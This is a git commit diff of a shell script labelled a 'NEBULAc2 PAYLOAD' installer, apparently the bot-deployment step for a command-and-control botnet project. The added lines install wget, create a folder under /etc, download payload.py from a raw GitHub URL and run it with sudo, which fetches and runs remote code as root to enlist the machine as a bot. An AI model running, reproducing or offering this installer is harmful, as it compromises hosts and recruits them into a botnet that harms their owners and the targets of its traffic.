5f19b08012e8366ff523df35fa643d20124961b9
HaxTermux <93824226+Hex1629@users.noreply.github.com>
2023-05-17 19:40:11 +0700

    Update shit.sh

--- shit.sh
+++ shit.sh
@@ -1,10 +1,10 @@
 echo NEBULAc2 PAYLOAD VERSION FIX XD
 echo github --> NixWasHere/NebulaC2
 echo
-sudo apt install screen && sudo apt install python3 && sudo apt install python && yum install python3 && yum install python && pkg install python3 && pkg install python
+sudo apt install wget && sudo apt install screen && sudo apt install python3 && sudo apt install python && yum install python3 && yum install python && pkg install python3 && pkg install python
 pip install requests && pip3 install requests
 cd /etc
-mkdir shit_bot
-cd /etc/shit_bot
-curl https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/payload.py
-sudo screen python3 bot.py
+sudo mkdir shitbot
+cd /etc/shitbot
+sudo wget https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/payload.py
+sudo python3 payload.py
